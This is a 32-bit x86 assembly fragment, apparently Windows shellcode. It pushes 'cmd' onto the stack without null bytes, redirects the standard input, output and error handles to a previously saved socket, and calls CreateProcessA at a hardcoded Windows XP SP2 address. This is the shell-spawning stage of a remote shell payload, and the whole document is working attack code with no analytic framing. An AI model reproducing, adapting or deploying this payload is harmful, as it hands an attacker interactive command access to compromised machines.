[BITS 32]

global _start
_start:

;--- Setup our pointer to cmd
mov edx, 0x646d6363	; cmdd
shr edx, 8		      ; cmd, we need the shift to not send null bytes
push edx            ; save the value to the stack
mov ecx, esp		    ; store it in ECX

;--- Pointer to ProcessInfo
sub esp, 16     ; point ESP to garbage
mov ebx, esp		; save pointer to garbage in EBX

;--- Pointer to StartUpInfo
push esi		  ; hStdError - saved socket
push esi		  ; hStdOutput - saved socket
push esi		  ; hStdInput -saved socket
xor edx, edx  ; clear edx
push edx		  ; pReserved2 - NULL
push edx		  ; cbReserved2 -NULL
xor eax, eax  ; clear eax
inc eax
rol eax, 8
push eax		  ; dwFlags - STARTF_USESTDHANDLES 0x00000100
push edx		  ; dwFillAttribute - NULL
push edx		  ; dwYCountChars - NULL
push edx		  ; dwXCountChars - NULL
push edx		  ; dwYSize - NULL
push edx		  ; dwXSize - NULL
push edx		  ; dwY - NULL
push edx		  ; dwX - NULL
push edx		  ; pTitle - NULL
push edx		  ; pDesktop - NULL
push edx		  ; pReserved - NULL
xor eax, eax  ; clear eax
add al, 44
push eax		  ; cb - size of structure
mov eax, esp	; pStartupInfo

;--- CreateProcessA
push ebx		        ; pProcessInfo
push eax		        ; pStartupInfo
push edx		        ; CurrentDirectory - NULL
push edx		        ; pEnvironment - NULL
push edx		        ; CreationFlags - 0
xor eax, eax
inc eax
push eax		        ; InheritHandles -TRUE - 1
push edx		        ; pThreadAttributes -NULL
push edx		        ; pProcessAttributes - NULL

push ecx		        ; pCommandLine - pointer to "cmd"
push edx		        ; ApplicationName - NULL

mov ebx, 0x7c802367	; CreateProcessA - WinXP PRO SP2
call ebx
